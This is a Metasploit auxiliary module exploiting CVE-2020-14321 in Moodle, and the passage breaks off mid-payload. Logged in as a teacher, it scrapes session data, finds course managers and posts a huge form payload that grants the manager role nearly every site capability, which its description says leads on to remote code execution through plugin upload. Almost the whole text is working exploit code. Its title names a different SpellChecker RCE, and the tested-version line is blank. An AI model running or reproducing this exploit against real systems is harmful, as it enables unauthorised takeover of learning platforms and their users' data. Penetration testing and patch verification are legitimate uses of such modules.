##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Moodle

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Moodle SpellChecker Path Authenticated Remote Command Execution',
        'Description' => %q{
          Moodle allows an authenticated teacher to privilege escalate to a manager.  With this access,
          it is then possible to reconfigure the site permissions to allow managers to install plugins.
          This can then be exploited for RCE via exploits/multi/http/moodle_admin_shell_upload

          This module was tested against Moodle version
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'HoangKien1020', # Discovery, POC
          'lanz', # edb
          'h00die' # msf module
        ],
        'References' => [
          ['CVE', '2020-14321'],
          ['URL', 'https://moodle.org/mod/forum/discuss.php?d=407393'],
          ['URL', 'https://github.com/HoangKien1020/CVE-2020-14321'],
          ['EDB', '50180']
        ],
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2020-07-20',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'Username to authenticate with', '']),
        OptString.new('PASSWORD', [ true, 'Password to authenticate with', '']),
        OptInt.new('MAXUSERS', [true, 'Maximum amount of users to add to course looking for admin', 100])
      ]
    )
  end

  def get_user_info
    print_status('Retrieving user info')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user', 'profile.php'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, 'Error retrieving user id') unless res
    # user id
    res.body =~ /id=(\d)/
    userid = Regexp.last_match(1)
    # course id
    res.body =~ /course=(\d)/
    courseid = Regexp.last_match(1)
    # session key
    res.body =~ /"sesskey":"(.*?)"/
    sesskey = Regexp.last_match(1)
    return userid, courseid, sesskey
  end

  def get_course_managers(context_id)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user', 'index.php'),
      'vars_get' =>
        {
          'roleid' => '1',
          'contextid' => context_id
        },
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, 'Error retrieving settings') unless res
    return res.body.scan(/id=(\d)&amp;course/).flatten
  end

  def give_manager_all_permissions(sess_key)
    # we need raw for repeated data properties where a dict overwrites them
    res = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'roles', 'define.php?roleid=1&action=edit'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/x-www-form-urlencoded' },
      'cookie' => "#{cookie_jar.cookies[0].name}=#{cookie_jar.cookies[0].value}",
      # https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions
      # or
      # https://github.com/HoangKien1020/CVE-2020-14321/blob/master/cve202014321.py#L113
      'data' => "sesskey=#{sess_key}&return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel30=1&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel70=1&contextlevel80=0&contextlevel80=1&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=1&block%2Fbadges%3Amyaddinstance=1&block%2Fcalendar_month%3Amyaddinstance=1&block%2Fcalendar_upcoming%3Amyaddinstance=1&block%2Fcomments%3Amyaddinstance=1&block%2Fcourse_list%3Amyaddinstance=1&block%2Fglobalsearch%3Amyaddinstance=1&block%2Fglossary_random%3Amyaddinstance=1&block%2Fhtml%3Amyaddinstance=1&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=1&block%2Fmentees%3Amyaddinstance=1&block%2Fmnet_hosts%3Amyaddinstance=1&block%2Fmyoverview%3Amyaddinstance=1&block%2Fmyprofile%3Amyaddinstance=1&block%2Fnavigation%3Amyaddinstance=1&block%2Fnews_items%3Amyaddinstance=1&block%2Fonline_users%3Amyaddinstance=1&block%2Fprivate_files%3Amyaddinstance=1&block%2Frecentlyaccessedcourses%3Amyaddinstance=1&block%2Frecentlyaccesseditems%3Amyaddinstance=1&block%2Frss_client%3Amyaddinstance=1&block%2Fsettings%3Amyaddinstance=1&block%2Fstarredcourses%3Amyaddinstance=1&block%2Ftags%3Amyaddinstance=1&block%2Ftimeline%3Amyaddinstance=1&enrol%2Fcategory%3Asynchronised=1&message%2Fairnotifier%3Amanagedevice=1&moodle%2Fanalytics%3Alistowninsights=1&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=1&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=1&moodle%2Fportfolio%3Aexport=1&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=1&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=1&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=1&moodle%2Fsite%3Amaintenanceaccess=1&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=1&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=1&moodle%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=1&moodle%2Fuser%3Amanageownblocks=1&moodle%2Fuser%3Amanageownfiles=1&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=1&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=1&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=1&tool%2Fdataprivacy%3Amanagedatarequests=1&tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=1&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=1&moodle%2Fbadges%3Amanageownbadges=1&moodle%2Fbadges%3Aviewotherbadges=1&moodle%2Fcompetency%3Aevidencedelete=1&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=1&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=1&moodle%2Fcompetency%3Aplanmanageowndraft=1&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=1&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=1&moodle%2Fcompetency%3Aplanviewowndraft=1&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=1&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=1&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=1&report%2Fusersessions%3Amanageownsessions=1&tool%2Fdataprivacy%3Adownloadallrequests=1&tool%2Fdataprivacy%3Adownloadownrequest=1&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&tool%2Fdataprivacy%3Arequestdelete=1&tool%2Fpolicy%3Aacceptbehalf=1&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=1&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=1&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=1&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=1&block%2Frecent_activity%3Aviewaddupdatemodule=1&block%2Frecent_activity%3Aviewdeletemodule=1&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=1&enrol%2Fflatfile%3Aunenrol=1&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=1&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=1&enrol%2Fpaypal%3Aunenrolself=1&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=1&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=1&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=1&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=1&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=1&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=1&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=1&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=1&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=1&moodle%2Fcourse%3Aisincompletionreports=1&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=1&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=1&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=1&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=1&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=1&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=1&webservice%2Fsoap%3Ause=1&webservice%2Fxmlrpc%3Ause=1&atto%2Fh5p%3Aaddembed=1&atto%2Frecordrtc%3Arecordaudio=1&atto%2Frecordrtc%3Arecordvideo=1&booktool%2Fexportimscp%3Aexport=1&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=1&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=1&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=1&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=1&mod%2Fchoice%3Achoose=1&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=1&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=1&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=1&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=1&mod%2Ffolder%3Aview=1&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=1&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=1&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=1&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=1&mod%2Flabel%3Aview=1&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=1&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=1&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=1&mod%2Fquiz%3Aattempt=1&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=1&mod%2Fquiz%3Aemailnotifysubmission=1&mod%2Fquiz%3Aemailwarnoverdue=1&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=1&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=1&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=1&mod%2Fscorm%3Adeleteownresponses=1&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=1&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=1&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=1&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=1&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=1&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=1&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=1&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=1&quiz%2Fgrading%3Aviewstudentnames=1&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_show